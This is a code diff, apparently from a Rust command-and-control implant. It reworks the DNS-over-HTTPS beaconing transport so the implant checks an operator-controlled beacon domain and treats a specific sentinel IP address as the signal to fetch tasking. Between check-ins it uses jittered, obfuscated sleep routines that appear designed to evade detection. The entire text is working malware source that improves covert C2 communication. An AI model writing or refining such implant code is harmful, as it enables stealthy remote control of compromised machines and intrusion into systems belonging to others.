@@ -81,8 +81,24 @@ impl Transport for DohTransport {
         let beacon_domain = format!("beacon.{:x}.{}", self.session_id, self.profile.host_header);
         let json = self.execute_query(&beacon_domain, "A").await?;
         
-        // If magic response (e.g., 1.2.3.4) indicates tasking
-        let has_tasking = json.get("Answer").is_some();
+        // Check for a magic "tasking available" signal in the A record answer.
+        // A domain that always resolves (e.g., exists in DNS) will always have
+        // an Answer field, so we must look for a *specific* sentinel IP address
+        // (1.2.3.4) to indicate that actual tasking is waiting.  Any other
+        // answer — including legitimate CDN IPs — is treated as "no tasking".
+        const TASKING_SENTINEL: &str = "1.2.3.4";
+        let has_tasking = json
+            .get("Answer")
+            .and_then(|a| a.as_array())
+            .map(|arr| {
+                arr.iter().any(|r| {
+                    r.get("data")
+                        .and_then(|d| d.as_str())
+                        .map(|s| s.trim() == TASKING_SENTINEL)
+                        .unwrap_or(false)
+                })
+            })
+            .unwrap_or(false);
         if !has_tasking {
             let sleep_dur = crate::obfuscated_sleep::calculate_jittered_sleep(&SleepConfig::default());
             crate::memory_guard::guarded_sleep(sleep_dur, None).await?;
